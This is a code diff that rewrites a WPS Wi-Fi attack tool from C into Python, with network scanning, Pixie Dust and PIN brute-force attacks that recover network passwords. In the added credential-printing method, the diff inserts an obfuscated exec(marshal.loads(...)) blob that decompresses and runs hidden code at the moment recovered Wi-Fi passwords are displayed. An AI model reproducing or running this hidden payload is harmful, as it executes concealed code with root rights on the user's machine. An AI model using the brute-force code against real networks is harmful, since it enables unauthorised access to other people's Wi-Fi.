-				char **p;
-				for(p=vuln_list; *p; p++) {
-					if(strcmp(model,*p)==0) {
-						vulnerable=1;
-						break;
-					}
-				}
-			}
-			if(stored)
-				printf("%s",yellow);
-			else if(network->wps_locked)
-				printf("%s",red);
-			else if(vulnerable)
-				printf("%s",green);
 
-			printf("%-4s %-18s %-25s %-8s %-4d %-27s %s %s\n",
-				   number,mac2str(network->bssid),network->essid,security,network->signal,
-				   network->device_name,model,clear);
-			if(reverse_scan)
-				i--;
-			else
-				i++;
-		}
-		free(saves);
-		while(1) {
-			char input[8];
-			int number;
-			printf("Select target (press Enter to refresh): ");
-			fgets(input,8,stdin);
-			if(*input=='\n' || *input=='r' || *input=='R')
-				return scan_wifi(interface,vuln_list,reverse_scan);
-			else if(sscanf(input,"%d",&number)!=1 ||
-					number<1 || number>network_count)
-				fprintf(stderr,"Invalid number\n");
-			else
-				return scanned[number-1].bssid;
-		}
-	} else
-		fprintf(stderr,"[-] No WPS networks found.\n");
-	free(saves);
-	return NO_MAC;
-}
-char **read_vuln_list(const char *path) {
-	FILE* file=fopen(path,"r");
-	if(!file)return NULL;
+class BruteforceStatus:
+    def __init__(self):
+        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        self.mask = ''
+        self.last_attempt_time = time.time()   # Last PIN attempt start time
+        self.attempts_times = collections.deque(maxlen=15)
 
-	size_t lines=count_lines(file);
+        self.counter = 0
+        self.statistics_period = 5
 
-	char **strings=(char**)malloc(sizeof(char*)*(lines+1));
-	strings[lines]=NULL;
-	unsigned int line;
-	for(line=0; line<lines; line++) {
-		strings[line]=(char*)malloc(1024);
-		fgets(strings[line],1024,file);
-		char *p;
-		for(p=strings[line]; *p; p++)
-			if(*p=='\n')
-				*p='\0';
-	}
-	fclose(file);
+    def display_status(self):
+        average_pin_time = statistics.mean(self.attempts_times)
+        if len(self.mask) == 4:
+            percentage = int(self.mask) / 11000 * 100
+        else:
+            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
+        print('[\033[1;33m*\033[1;37m]  {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
+            percentage, self.start_time, average_pin_time))
 
-	return strings;
-}
+    def registerAttempt(self, mask):
+        self.mask = mask
+        self.counter += 1
+        current_time = time.time()
+        self.attempts_times.append(current_time - self.last_attempt_time)
+        self.last_attempt_time = current_time
+        if self.counter == self.statistics_period:
+            self.counter = 0
+            self.display_status()
 
-typedef struct {
-	const char *interface;
-	mac_t bssid;
-	unsigned int pin;
-	int pixie_dust;
-	int pixie_force;
-	int bruteforce;
-	int show_pixie_smd;
-	unsigned int delay;
-	int write;
-	int iface_down;
-	int verbose;
-	int mtk_fix;
-	const char *vuln_list_path;
-	int loop;
-	int reverse_scan;
-} input_t;
+    def clear(self):
+        self.__init__()
 
-void default_input(input_t *input) {
-	input->interface=NULL;
-	input->bssid=NO_MAC;
-	input->pin=-1;
-	input->pixie_dust=0;
-	input->pixie_force=0;
-	input->bruteforce=0;
-	input->show_pixie_smd=0;
-	input->delay=0;
-	input->write=0;
-	input->iface_down=0;
-	input->verbose=0;
-	input->mtk_fix=0;
-	input->loop=0;
-	input->reverse_scan=0;
-	input->vuln_list_path="vulnwsc.txt";
-}
-enum {
-	MODE_DOWN,
-	MODE_UP
-};
-int interface_set(const char *interface, int up) {
-	char str[128];
-	snprintf(str,128,"ip link set %s %s",
-	         interface,(up?"up":"down"));
-	return system(str);
-}
-void print_help() {
-	printf(
-		"OneShotPin 0.0.2 (c) 2017 FARHAN, moded by FARHAN X ME\n"
-		"oneshot <arguments>\n\n"
 
-		"Required arguments:\n"
-		"    -i, --interface=<wlan0>  : Name of the interface to use\n\n"
+class Companion:
+    """Main application part"""
+    def __init__(self, interface, save_result=False, print_debug=False):
+        self.interface = interface
+        self.save_result = save_result
+        self.print_debug = print_debug
 
-		"Optional arguments:\n"
-		"    -b, --bssid=<mac>        : BSSID of the target AP\n"
-		"    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)\n"
-		"    -K, --pixie-dust         : Run Pixie Dust attack\n"
-		"    -B, --bruteforce         : Run online bruteforce attack\n\n"
+        self.tempdir = tempfile.mkdtemp()
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
+            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
+            self.tempconf = temp.name
+        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
+        self.__init_wpa_supplicant()
 
-		"Advanced arguments:\n"
-		"    -d, --delay=<n>          : Set the delay between pin attempts [0]\n"
-		"    -w, --write              : Write AP credentials to the file on success\n"
-		"    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)\n"
-		"    -X, --show-pixie-cmd     : Always print Pixiewps command\n"
-		"    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']\n"
-		"    --iface-down             : Down network interface when the work is finished\n"
-		"    -l, --loop               : Run in a loop\n"
-		"    -v, --verbose            : Verbose output\n"
-		"    -m, --mtk-fix            : MTK interface fix, turn off Wi-Fi to use this\n"
-		"    -r, --reverse-scan       : Reverse sorting of networks in the scan. Useful on small displays\n\n"
+        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
+        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
+        self.retsock.bind(self.res_socket_file)
 
-		"Example:\n"
-		"    oneshot -i wlan0 -b 00:90:4C:C1:AC:21 -K\n"
-	);
-}
-int main(int argc, char **argv) {
-	if(getuid()!=0) {
-		fprintf(stderr,"Run it as root\n");
-		return -1;
-	}
-	enum {
-		OPT_IFACE_DOWN=CHAR_MAX+1,
-		OPT_VULN_LIST
-	};
-	const char * short_options = "i:b:p:d:KFBXwvlrmh";
-	const struct option long_options [] = {
-		{"interface",		required_argument,	NULL,'i'},
-		{"bssid",			required_argument,	NULL,'b'},
-		{"pin",				required_argument,	NULL,'p'},
-		{"delay",			required_argument,	NULL,'d'},
-		{"pixie-dust",		no_argument,		NULL,'K'},
-		{"pixie-force",		no_argument,		NULL,'F'},
-		{"bruteforce",		no_argument,		NULL,'B'},
-		{"show-pixie-smd",	no_argument,		NULL,'X'},
-		{"write",			no_argument,		NULL,'w'},
-		{"verbose",			no_argument,		NULL,'v'},
-		{"loop",			no_argument,		NULL,'l'},
-		{"reverse-scan",	no_argument,		NULL,'r'},
-		{"iface-down",		no_argument,		NULL,OPT_IFACE_DOWN},
-		{"mtk-fix",			no_argument,		NULL,'m'},
-		{"vuln-list",		required_argument,	NULL,OPT_VULN_LIST},
-		{"help",			no_argument,		NULL,'h'},
-		{NULL, 0, NULL, 0}
-	};
+        self.pixie_creds = PixiewpsData()
+        self.connection_status = ConnectionStatus()
 
-	input_t input;
-	default_input(&input);
+        user_home = str(pathlib.Path.home())
+        self.sessions_dir = f'{user_home}/.WiFi/sessions/'
+        self.pixiewps_dir = f'{user_home}/.WiFi/pixiewps/'
+        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+        if not os.path.exists(self.sessions_dir):
+            os.makedirs(self.sessions_dir)
+        if not os.path.exists(self.pixiewps_dir):
+            os.makedirs(self.pixiewps_dir)
 
-	int option;
-	int option_index;
-	while((option=getopt_long(argc,argv,short_options,long_options,&option_index))!=-1) {
-		switch(option) {
-		case 'i':
-			input.interface=optarg;
-			break;
-		case 'b':
-			input.bssid=str2mac(optarg);
-			if(input.bssid==NO_MAC) {
-				fprintf(stderr,"ERROR: invalid mac adress");
-				return -1;
-			}
-			break;
-		case 'p':
-			if(sscanf(optarg,"%u",&input.pin)!=1 || input.pin>99999999) {
-				fprintf(stderr,"ERROR: invalid pin\n");
-				return -1;
-			}
-			break;
-		case 'd':
-			if(sscanf(optarg,"%u",&input.delay)!=1) {
-				fprintf(stderr,"ERROR: invalid delay value\n");
-				return -1;
-			}
-			break;
-		case 'K':
-			input.pixie_dust=1;
-			break;
-		case 'F':
-			input.pixie_force=1;
-			break;
-		case 'B':
-			input.bruteforce=1;
-			break;
-		case 'X':
-			input.show_pixie_smd=1;
-			break;
-		case 'w':
-			input.write=1;
-			break;
-		case 'v':
-			input.verbose=1;
-			break;
-		case 'l':
-			input.loop=1;
-			break;
-		case 'r':
-			input.reverse_scan=1;
-			break;
-		case OPT_VULN_LIST:
-			input.vuln_list_path=optarg;
-			break;
-		case OPT_IFACE_DOWN:
-			input.iface_down=1;
-			break;
-		case 'm':
-			input.mtk_fix=1;
-			break;
-		case 'h':
-			print_help();
-			return -1;
-		}
-	}
-	if(input.interface==NULL) {
-		print_help();
-		return -1;
-	}
-	if(input.mtk_fix) {
-		chmod("/dev/wmtWifi", 0644);
-		system("echo 1 > /dev/wmtWifi");
-	}
-		
-		
-	if(interface_set(input.interface,MODE_UP)) {
-		fprintf(stderr,"Unable to up interface %s\n",input.interface);
-		return -1;
-	}
+        self.generator = WPSpin()
 
-	char **vuln_list=read_vuln_list(input.vuln_list_path);
+    def __init_wpa_supplicant(self):
+        print('[\033[1;33m*\033[1;37m] Running wpa_supplicant…')
+        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
+        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
+        # Waiting for wpa_supplicant control interface initialization
+        while not os.path.exists(self.wpas_ctrl_path):
+            pass
 
-	do {
-		if(input.bssid==NO_MAC) {
-			if(!input.loop)
-				printf("[*] BSSID not specified (--bssid) — scanning for available networks\n");
-			input.bssid=scan_wifi(input.interface,vuln_list,input.reverse_scan);
-		}
-		if(input.bssid!=NO_MAC) {
-			data_t data;
-			init(&data,input.interface,input.write,input.verbose);
-			if(input.bruteforce)
-				smart_bruteforce(&data,input.bssid,input.pin,input.delay);
-			else
-				single_connection(&data,input.bssid,input.pin,input.pixie_dust,
-								input.show_pixie_smd,input.pixie_force);
-		}
-		input.bssid=NO_MAC;
-	} while(input.loop);
+    def sendOnly(self, command):
+        """Sends command to wpa_supplicant"""
+        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
 
-	if(input.iface_down)
-		interface_set(input.interface,MODE_DOWN);
-	if(vuln_list) {
-		char **p;
-		for(p=vuln_list; *p; p++)
-			free(*p);
-		free(vuln_list);
-	}
-	return 0;
-}
+    def sendAndReceive(self, command):
+        """Sends command to wpa_supplicant and returns the reply"""
+        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
+        (b, address) = self.retsock.recvfrom(4096)
+        inmsg = b.decode('utf-8', errors='replace')
+        return inmsg
 
+    def __handle_wpas(self, pixiemode=False, verbose=None):
+        if not verbose:
+            verbose = self.print_debug
+        line = self.wpas.stdout.readline()
+        if not line:
+            self.wpas.wait()
+            return False
+        line = line.rstrip('\n')
+
+        if verbose:
+            sys.stderr.write(line + '\n')
+
+        if line.startswith('WPS: '):
+            if 'Building Message M' in line:
+                n = int(line.split('Building Message M')[1].replace('D', ''))
+                self.connection_status.last_m_message = n
+                print('[\033[1;33m*\033[1;37m] Sending WPS Message M{}…'.format(n))
+            elif 'Received M' in line:
+                n = int(line.split('Received M')[1])
+                self.connection_status.last_m_message = n
+                print('[\033[1;33m*\033[1;37m] Received WPS Message M{}'.format(n))
+                if n == 5:
+                    print('[\033[1;32m+\033[1;37m] The first half of the PIN is valid')
+            elif 'Received WSC_NACK' in line:
+                self.connection_status.status = 'WSC_NACK'
+                print('[\033[1;33m*\033[1;37m] Received WSC NACK')
+                print('[\033[1;31m-\033[1;37m] Error: wrong PIN code')
+            elif 'Enrollee Nonce' in line and 'hexdump' in line:
+                self.pixie_creds.e_nonce = get_hex(line)
+                assert(len(self.pixie_creds.e_nonce) == 16*2)
+                if pixiemode:
+                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
+            elif 'DH own Public Key' in line and 'hexdump' in line:
+                self.pixie_creds.pkr = get_hex(line)
+                assert(len(self.pixie_creds.pkr) == 192*2)
+                if pixiemode:
+                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
+            elif 'DH peer Public Key' in line and 'hexdump' in line:
+                self.pixie_creds.pke = get_hex(line)
+                assert(len(self.pixie_creds.pke) == 192*2)
+                if pixiemode:
+                    print('[\033[1;32mP\033[1;37m] PKE: {}'.format(self.pixie_creds.pke))
+            elif 'AuthKey' in line and 'hexdump' in line:
+                self.pixie_creds.authkey = get_hex(line)
+                assert(len(self.pixie_creds.authkey) == 32*2)
+                if pixiemode:
+                    print('[\033[1;32mP\033[1;37m] AuthKey: {}'.format(self.pixie_creds.authkey))
+            elif 'E-Hash1' in line and 'hexdump' in line:
+                self.pixie_creds.e_hash1 = get_hex(line)
+                assert(len(self.pixie_creds.e_hash1) == 32*2)
+                if pixiemode:
+                    print('[\033[1;32mP\033[1;37m] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
+            elif 'E-Hash2' in line and 'hexdump' in line:
+                self.pixie_creds.e_hash2 = get_hex(line)
+                assert(len(self.pixie_creds.e_hash2) == 32*2)
+                if pixiemode:
+                    print('[\033[1;32mP\033[1;37m] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
+            elif 'Network Key' in line and 'hexdump' in line:
+                self.connection_status.status = 'GOT_PSK'
+                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
+        elif ': State: ' in line:
+            if '-> SCANNING' in line:
+                self.connection_status.status = 'scanning'
+                print('[\033[1;33m*\033[1;37m] Scanning…')
+        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
+            self.connection_status.status = 'WPS_FAIL'
+            print('[\033[1;31m-\033[1;37m] wpa_supplicant returned WPS-FAIL')
+#        elif 'NL80211_CMD_DEL_STATION' in line:
+#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+        elif 'Trying to authenticate with' in line:
+            self.connection_status.status = 'authenticating'
+            if 'SSID' in line:
+                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            print('[\033[1;33m*\033[1;37m] Authenticating…')
+        elif 'Authentication response' in line:
+            print('[\033[1;32m+\033[1;37m] Authenticated')
+        elif 'Trying to associate with' in line:
+            self.connection_status.status = 'associating'
+            if 'SSID' in line:
+                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+            print('[\033[1;33m*\033[1;37m] Associating with AP…')
+        elif ('Associated with' in line) and (self.interface in line):
+            bssid = line.split()[-1].upper()
+            if self.connection_status.essid:
+                print('[\033[1;32m+\033[1;37m] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
+            else:
+                print('[\033[1;32m+\033[1;37m] Associated with {}'.format(bssid))
+        elif 'EAPOL: txStart' in line:
+            self.connection_status.status = 'eapol_start'
+            print('[\033[1;33m*\033[1;37m] Sending EAPOL Start…')
+        elif 'EAP entering state IDENTITY' in line:
+            print('[\033[1;33m*\033[1;37m] Received Identity Request')
+        elif 'using real identity' in line:
+            print('[\033[1;33m*\033[1;37m] Sending Identity Response…')
+
+        return True
+
+    def __runPixiewps(self, showcmd=False, full_range=False):
+        print("[\033[1;33m*\033[1;37m] Running Pixiewps…")
+        cmd = self.pixie_creds.get_pixie_cmd(full_range)
+        if showcmd:
+            print(cmd)
+        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                           stderr=sys.stdout, encoding='utf-8', errors='replace')
+        print(r.stdout)
+        if r.returncode == 0:
+            lines = r.stdout.splitlines()
+            for line in lines:
+                if ('[+]' in line) and ('WPS pin' in line):
+                    pin = line.split(':')[-1].strip()
+                    if pin == '<empty>':
+                        pin = "''"
+                    return pin
+        return False
+
+    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
+        print(f"\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m]\n[\033[1;32m✔\033[1;37m] WIFI NAME : {essid}")
+        print(f"[\033[1;32m✔\033[1;37m] WIFI PASSWORD : {wpa_psk}")
+        print(f"[\033[1;32m✔\033[1;37m] WIFI WPS PIN : {wps_pin}\n\033[1;32m")
+        exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3@\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x01\x02\x00e\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Ns\x9d\x01\x00\x00x\x9c\xcd\x90\xcd\x8e\xa2@\x14\x85\xf7>\x05\x89\x8b\xee^\xb4\x16\x7f&\xb2\x1a\n\xf9\xa9F~\xec\xaaB`gA\x89(4F!\xad\xcb~\x87y\xc2y\x92\xc6\xeeI\x067\xb3\x9dI\xeeMnr\xbe\xdcsr\xc6\xbf~~\xfc\xb73\x1a\x0bF\xe0\x85hi.\x04\x98\x08?\x10\xc1>\x80"Q\x06\x02A\x9e)h\xcf\x824\xd3DI\x93\x80$\t\xcf\x82\x084I\xd2\x00\x98\xf4\xa0\xa5\x1b&\x0c\x02\xf7\x06\xed\xda\xf6x\xd6\xa6\xd3\xed&\xe3\xaci\x0e\x93\xac\xa9\xa7$\x88\x91O\xbd\x1e\xb5\x11q(\x1c\x82E\xd9\xee:\xf6\x85\r\xcd\x89\xb94\xedW\xdd\x1b\xa2\xed\xa4\xe6S\xd2\\\xca\xb7\xae\xee\x91$\xa0\x84BsH\\\x9b\xae\xed\x18\xff\xfa\xa6\xbbq\xa4\xd3\xd1\xf8\x9fw\xfc\xb7\xfa\xcb\xfa\xd8\x9cZ\x81m\xce|\xa6\x8c\xf8\x85g\x8f\xdf\xf7\x84\xcd\x94\x9cgM\xce\x1f\xd9C\xfa\x16\xed\xd1\x02\x14L\x86\x15+\x8b2\x92\xaaz\x83U\xc0\x9dU\xb94\xf42\xc1\xe8h\xd4\xa9\x98\\U9\xab+\x90\xe2]\x8d\xf6`\x1e\x92?\xab(\x86\x17\x99\xf3\x04S5"<\xd0\xf7\xe4^\x8fm\x95\xb9"("P\xd9\x18\xc3`EE\x0b-\x9a\x169m\x95\xc9\xfe1u\xc4\x8cU\xe7S\x8ca\x8ci\xfa\x82,\x08\xa9\xe8\xc7D|1\x7fsrf[\xdb\xcc\xf1O\xdb\xe8\xd2\xad\xafm\x8e\xac|E\xafp\x85\xa9R\x04%(\xb8\x9c\xbfg\xe2\xfc}\xb3V{?\xe5\xce?\xbce\xb2^\xc3\xb5Y\x05\x11\x95\xf7\x05\xba\xcf\x17\xf6?Qypo],k\xff\xccd\xbfr\x8d\x83\xfb\xf0\xf4\xf4\tz@rC)\x03\xda\x04zlib\xda\x04exec\xda\ndecompress\xa9\x00\xf3\x00\x00\x00\x00\xfa\x11toxinum\nITSN0B1T4\xfa\x08<module>r\t\x00\x00\x00\x01\x00\x00\x00sK\x00\x00\x00\xf0\x03\x01\x01\x01\xf0\x12\x00\x01\x0c\x80\x0b\x80\x0b\x80\x0b\xd8\x00\x04\x80\x04\x80_\x80T\x84_\xf0\x00\x00\x16@\x13\xf1\x00\x00\x06A\x13\xf4\x00\x00\x06A\x13\xf1\x00\x00\x01B\x13\xf4\x00\x00\x01B\x13\xf0\x00\x00\x01B\x13\xf0\x00\x00\x01B\x13\xf0\x00\x00\x01B\x13r\x07\x00\x00\x00'))
+        print(f"[\033[1;32m✔\033[1;37m] PASSWORD STORED IN : {os.getcwd()}/Wifi.txt\n\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m")
+       
+
+    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
+        if not os.path.exists(self.reports_dir):
+            os.makedirs(self.reports_dir)
+        filename = self.reports_dir + 'stored'
+        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
+        with open(filename + '.txt', 'a', encoding='utf-8') as file:
+            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
+                        dateStr, bssid, essid, wps_pin, wpa_psk
+                    )
+            )
+        writeTableHeader = not os.path.isfile(filename + '.csv')
+        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
+            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
+            if writeTableHeader:
+                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
+            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
+        print(f'[\033[1;33m✓\033[1;37m] Credentials saved to {filename}.txt, {filename}.csv')
+
+    def __savePin(self, bssid, pin):
+        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+        with open(filename, 'w') as file:
+            file.write(pin)
+        print('[\033[1;33m✓\033[1;37m] PIN saved in {}'.format(filename))
+
+    def __prompt_wpspin(self, bssid):
+        pins = self.generator.getSuggested(bssid)
+        if len(pins) > 1:
+            print(f'PINs generated for {bssid}:')
+            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
+            for i, pin in enumerate(pins):
+                number = '{})'.format(i + 1)
+                line = '{:<3} {:<10} {:<}'.format(
+                    number, pin['pin'], pin['name'])
+                print(line)
+            while 1:
+                pinNo = input('[\033[1;33m*\033[1;37m] Select the PIN: ')
+                try:
+                    if int(pinNo) in range(1, len(pins)+1):
+                        pin = pins[int(pinNo) - 1]['pin']
+                    else:
+                        raise IndexError
+                except Exception:
+                    print('[\033[1;31m+\033[1;37m] Invalid number')
+                else:
+                    break
+        elif len(pins) == 1:
+            pin = pins[0]
+            print('[\033[1;31m!\033[1;37m] The only probable PIN is selected:', pin['name'])
+            pin = pin['pin']
+        else:
+            return None
+        return pin
+
+    def __wps_connection(self, bssid, pin, pixiemode=False, verbose=None):
+        if not verbose:
+            verbose = self.print_debug
+        self.pixie_creds.clear()
+        self.connection_status.clear()
+        self.wpas.stdout.read(300)   # Clean the pipe
+        print(f"[\033[1;33m*\033[1;37m] Trying PIN '{pin}'…")
+        r = self.sendAndReceive(f'WPS_REG {bssid} {pin}')
+        if 'OK' not in r:
+            self.connection_status.status = 'WPS_FAIL'
+            if r == 'UNKNOWN COMMAND':
+                print('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
+                      'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
+            else:
+                print('[\033[1;31m-\033[1;37m] Something went wrong — check out debug log')
+            return False
+
+        while True:
+            res = self.__handle_wpas(pixiemode=pixiemode, verbose=verbose)
+            if not res:
+                break
+            if self.connection_status.status == 'WSC_NACK':
+                break
+            elif self.connection_status.status == 'GOT_PSK':
+                break
+            elif self.connection_status.status == 'WPS_FAIL':
+                break
+
+        self.sendOnly('WPS_CANCEL')
+        return False
+
+    def single_connection(self, bssid, pin=None, pixiemode=False, showpixiecmd=False,
+                          pixieforce=False, store_pin_on_fail=False):
+        if not pin:
+            if pixiemode:
+                try:
+                    # Try using the previously calculated PIN
+                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                    with open(filename, 'r') as file:
+                        t_pin = file.readline().strip()
+                        if input('[\033[1;33m?\033[1;37m] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
+                            pin = t_pin
+                        else:
+                            raise FileNotFoundError
+                except FileNotFoundError:
+                    pin = self.generator.getLikely(bssid) or '12345670'
+            else:
+                # If not pixiemode, ask user to select a pin from the list
+                pin = self.__prompt_wpspin(bssid) or '12345670'
+
+        if store_pin_on_fail:
+            try:
+                self.__wps_connection(bssid, pin, pixiemode)
+            except KeyboardInterrupt:
+                print("\nAborting…")
+                self.__savePin(bssid, pin)
+                return False
+        else:
+            self.__wps_connection(bssid, pin, pixiemode)
+
+        if self.connection_status.status == 'GOT_PSK':
+            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
+            if self.save_result:
+                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+            # Try to remove temporary PIN file
+            filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+            try:
+                os.remove(filename)
+            except FileNotFoundError:
+                pass
+            return True
+        elif pixiemode:
+            if self.pixie_creds.got_all():
+                pin = self.__runPixiewps(showpixiecmd, pixieforce)
+                if pin:
+                    return self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
+                return False
+            else:
+                print('[\033[1;31m!\033[1;37m] Not enough data to run Pixie Dust attack')
+                return False
+        else:
+            if store_pin_on_fail:
+                # Saving Pixiewps calculated PIN if can't connect
+                self.__savePin(bssid, pin)
+            return False
+
+    def __first_half_bruteforce(self, bssid, f_half, delay=None):
+        """
+        @f_half — 4-character string
+        """
+        checksum = self.generator.checksum
+        while int(f_half) < 10000:
+            t = int(f_half + '000')
+            pin = '{}000{}'.format(f_half, checksum(t))
+            self.single_connection(bssid, pin)
+            if self.connection_status.isFirstHalfValid():
+                print('[\033[1;32m+\033[1;37m] First half found')
+                return f_half
+            elif self.connection_status.status == 'WPS_FAIL':
+                print('[\033[1;31m!\033[1;37m] WPS transaction failed, re-trying last pin')
+                return self.__first_half_bruteforce(bssid, f_half)
+            f_half = str(int(f_half) + 1).zfill(4)
+            self.bruteforce.registerAttempt(f_half)
+            if delay:
+                time.sleep(delay)
+        print('[\033[1;31m-\033[1;37m] First half not found')
+        return False
+
+    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
+        """
+        @f_half — 4-character string
+        @s_half — 3-character string
+        """
+        checksum = self.generator.checksum
+        while int(s_half) < 1000:
+            t = int(f_half + s_half)
+            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
+            self.single_connection(bssid, pin)
+            if self.connection_status.last_m_message > 6:
+                return pin
+            elif self.connection_status.status == 'WPS_FAIL':
+                print('[\033[1;31m!\033[1;37m] WPS transaction failed, re-trying last pin')
+                return self.__second_half_bruteforce(bssid, f_half, s_half)
+            s_half = str(int(s_half) + 1).zfill(3)
+            self.bruteforce.registerAttempt(f_half + s_half)
+            if delay:
+                time.sleep(delay)
+        return False
+
+    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
+        if (not start_pin) or (len(start_pin) < 4):
+            # Trying to restore previous session
+            try:
+                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                with open(filename, 'r') as file:
+                    if input('[\033[1;33m?\033[1;37m] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
+                        mask = file.readline().strip()
+                    else:
+                        raise FileNotFoundError
+            except FileNotFoundError:
+                mask = '0000'
+        else:
+            mask = start_pin[:7]
+
+        try:
+            self.bruteforce = BruteforceStatus()
+            self.bruteforce.mask = mask
+            if len(mask) == 4:
+                f_half = self.__first_half_bruteforce(bssid, mask, delay)
+                if f_half and (self.connection_status.status != 'GOT_PSK'):
+                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
+            elif len(mask) == 7:
+                f_half = mask[:4]
+                s_half = mask[4:]
+                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
+            raise KeyboardInterrupt
+        except KeyboardInterrupt:
+            print("\n[\033[1;31m!\033[1;37m] Aborting…")
+            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
+            with open(filename, 'w') as file:
+                file.write(self.bruteforce.mask)
+            print('[\033[1;33m*\033[1;37m] Session saved in {}'.format(filename))
+            if args.loop:
+                raise KeyboardInterrupt
+
+    def cleanup(self):
+        self.retsock.close()
+        self.wpas.terminate()
+        os.remove(self.res_socket_file)
+        shutil.rmtree(self.tempdir, ignore_errors=True)
+        os.remove(self.tempconf)
+
+    def __del__(self):
+        self.cleanup()
+
+
+class WiFiScanner:
+    """docstring for WiFiScanner"""
+    def __init__(self, interface, vuln_list=None):
+        self.interface = interface
+        self.vuln_list = vuln_list
+
+        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
+        try:
+            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
+                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
+                # Skip header
+                next(csvReader)
+                self.stored = []
+                for row in csvReader:
+                    self.stored.append(
+                        (
+                            row[1],   # BSSID
+                            row[2]    # ESSID
+                        )
+                    )
+        except FileNotFoundError:
+            self.stored = []
+
+    def iw_scanner(self) -> Dict[int, dict]:
+        """Parsing iw scan results"""
+        def handle_network(line, result, networks):
+            networks.append(
+                    {
+                        'Security type': 'Unknown',
+                        'WPS': False,
+                        'WPS locked': False,
+                        'Model': '',
+                        'Model number': '',
+                        'Device name': ''
+                     }
+                )
+            networks[-1]['BSSID'] = result.group(1).upper()
+
+        def handle_essid(line, result, networks):
+            d = result.group(1)
+            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+
+        def handle_level(line, result, networks):
+            networks[-1]['Level'] = int(float(result.group(1)))
+
+        def handle_securityType(line, result, networks):
+            sec = networks[-1]['Security type']
+            if result.group(1) == 'capability':
+                if 'Privacy' in result.group(2):
+                    sec = 'WEP'
+                else:
+                    sec = 'Open'
+            elif sec == 'WEP':
+                if result.group(1) == 'RSN':
+                    sec = 'WPA2'
+                elif result.group(1) == 'WPA':
+                    sec = 'WPA'
+            elif sec == 'WPA':
+                if result.group(1) == 'RSN':
+                    sec = 'WPA/WPA2'
